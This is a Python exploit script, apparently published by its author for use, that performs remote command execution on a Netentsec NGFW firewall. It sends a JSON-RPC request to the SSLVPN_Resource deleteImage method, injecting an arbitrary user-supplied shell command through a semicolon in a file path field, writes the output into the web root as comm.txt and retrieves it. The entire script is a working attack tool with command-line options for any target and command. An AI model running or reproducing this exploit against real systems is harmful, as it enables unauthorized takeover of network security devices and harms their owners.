#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import requests, urllib3, base64, time, json, argparse
from colorama import init
init(autoreset=True)

def title():
    print("")
    print('*'.center(60, '*'))
    print("网康NGFW下一代防火墙（版本未知）".center(30))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(40))
    print("")
    print('*'.center(60, '*'))
    print("")

def NGFW_RCE_EXP(url, command):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    target_url = f"{url}/directdata/direct/router"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
        "Cache-Control": "max-age=0",
        "accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
        "sec-ch-ua": '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Cookie": "PHPSESSID=q885n85a5es9i83d26rm102sk3; ys-active_page=s%3A",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = '''{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/.atest.txt;%s >/var/www/html/comm.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}''' %command

    try:
        s = requests.session()
        s.post(target_url, headers=headers, data=payload, verify=False, timeout=2)
        print(f"[done] 命令执行完成。\n")
        try:
            res = requests.get(f"{url}/comm.txt", timeout=2).text
            print(res)
        except Exception as e:
            print("命令执行结果获取失败！\n")
            print(f"可到{url}/comm.txt页面查看命令执行结果。")
    except Exception as e:
        print(f"[n] {url}请求失败！")
        return url

if (__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="netentsec NGFW RCE EXP")
    parser.add_argument(
        '-u', '--url', type=str, required=True,
        help='Please input target url. eg: https://ip:port'
    )
    parser.add_argument(
        '-c', '--command', type=str, required=True,
        help='Please input Linux command. eg: pwd'
    )
    args = parser.parse_args()
    NGFW_RCE_EXP(args.url, args.command)